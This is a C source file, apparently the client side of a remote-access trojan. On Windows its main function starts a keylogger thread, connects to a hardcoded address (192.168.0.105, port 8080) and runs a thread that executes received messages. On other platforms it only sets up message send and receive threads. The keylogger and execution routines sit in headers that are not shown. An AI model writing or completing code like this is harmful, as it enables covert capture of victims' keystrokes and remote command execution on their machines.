// File: client.c

#ifdef _WIN32
#include <winsock2.h>
#else
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#endif

#include "../common/socket.h"
#include "../common/common.h"
#include "keylogger.h"

#define PORT 8080
#define ADDRESS "192.168.0.105"
int main() {
	paramThread param;

	inisialisasiParamThread(&param);
	isiPort(&param, PORT);
	isiAddress(&param, ADDRESS);
	isiStatus(&param, 'C');


#ifdef _WIN32
	HANDLE cliSocket, sendMSG, execMSG, actKeylog;
	DWORD cliSocketId, sendMSGId, execMSGId, actKeylogId;

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2), &wsa);

	actKeylog = CreateThread(NULL, 0, activateKeylog, NULL, 0, &actKeylogId);
	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)&param, 0, &cliSocketId);
	//sendMSG = CreateThread(NULL, 0, sendMessage, (LPVOID)&param, 0, &sendMSGId);
	execMSG = CreateThread(NULL, 0, execMessage, (LPVOID)&param, 0, &execMSGId);


	WaitForSingleObject(cliSocket, INFINITE);
	CloseHandle(cliSocket);

	//WaitForSingleObject(sendMSG, INFINITE);
	//CloseHandle(sendMSG);

	WaitForSingleObject(execMSG, INFINITE);
	CloseHandle(execMSG);

	WaitForSingleObject(actKeylog, INFINITE);
	CloseHandle(actKeylog);

#else
	pthread_t cliSocket, send, get;

	pthread_create(&cliSocket, NULL, clientSocket, (void *)&param);
	pthread_create(&send, NULL, sendMessage, (void *)&(param.clientSocket));
	pthread_create(&get, NULL, getMessage, (void *)&param);

	pthread_join(cliSocket, NULL);
	pthread_join(send, NULL);
	pthread_join(get, NULL);

	// closing the connected socket
	close((param).clientSocket);	
#endif

	return 0;
}

